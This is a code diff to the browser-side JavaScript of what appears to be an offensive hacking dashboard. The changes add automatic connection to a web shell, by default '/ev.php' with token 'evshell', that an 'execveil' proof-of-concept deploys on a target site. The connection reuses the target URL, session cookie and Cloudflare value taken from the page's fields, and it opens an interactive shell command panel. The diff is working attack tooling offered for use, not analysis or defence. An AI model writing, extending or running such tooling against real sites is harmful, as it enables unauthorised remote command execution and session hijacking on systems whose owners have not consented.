@@ -521,7 +521,7 @@ function runTool() {
           const payload = part.slice(5).trim();
           try {
             const line = JSON.parse(payload);
-            if(line === '__DONE__') { setRunning(false); return; }
+            if(line === '__DONE__') { setRunning(false); autoConnectShellIfDeploy(); return; }
             appendLine(`<span class="line">${line}</span>`);
           } catch(e) {}
         }
@@ -591,9 +591,19 @@ function clearOutput() {
 function connectShell() {
   const path   = document.getElementById('ev-path').value || '/ev.php';
   const token  = document.getElementById('ev-token').value || 'evshell';
-  const url    = document.getElementById('g-url').value;
-  const cookie = document.getElementById('g-session').value;
-  const cf     = document.getElementById('g-cf').value;
+  // Try multiple sources for URL: global field, last deploy, or execveil field
+  const url    = document.getElementById('g-url').value
+              || (document.querySelector('[data-field="base_url"]') || {}).value
+              || '';
+  const cookie = document.getElementById('g-session').value
+              || (document.querySelector('[data-field="session"]') || {}).value
+              || '';
+  const cf     = document.getElementById('g-cf') ? document.getElementById('g-cf').value : '';
+
+  if(!url) {
+    shellLog('ERROR: No target URL set. Fill in the Target URL field first.', 'err');
+    return;
+  }
 
   fetch('/api/shell/connect', {
     method:'POST', headers:{'Content-Type':'application/json'},
@@ -606,6 +616,30 @@ function connectShell() {
       shellLog(`connected → ${d.endpoint}`, 'sys');
       document.getElementById('shell-cmd').focus();
     }
+  });
+}
+
+function autoConnectShellIfDeploy() {
+  // After tool finishes, check if it was execveil POC 5 and auto-connect shell
+  if(!currentTool || currentTool.id !== 'execveil') return;
+  const pocEl = document.querySelector('[data-id="poc"]');
+  if(!pocEl || pocEl.value !== '5') return;
+
+  fetch('/api/shell/last-deploy').then(r=>r.json()).then(d => {
+    if(!d.url) return;
+    // Auto-connect using stored deploy info
+    fetch('/api/shell/connect', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({url: d.url, path: d.path || '/ev.php', token: d.token || 'evshell', cookie: d.cookie || '', cf: d.cf || ''})
+    }).then(r=>r.json()).then(res => {
+      if(res.connected) {
+        document.getElementById('shell-panel').classList.add('visible');
+        document.getElementById('shell-connected').textContent = res.endpoint;
+        document.getElementById('shell-title').textContent = `SHELL  ·  ${d.token || 'evshell'}`;
+        shellLog(`auto-connected → ${res.endpoint}`, 'sys');
+        document.getElementById('shell-cmd').focus();
+      }
+    });
   });
 }
 
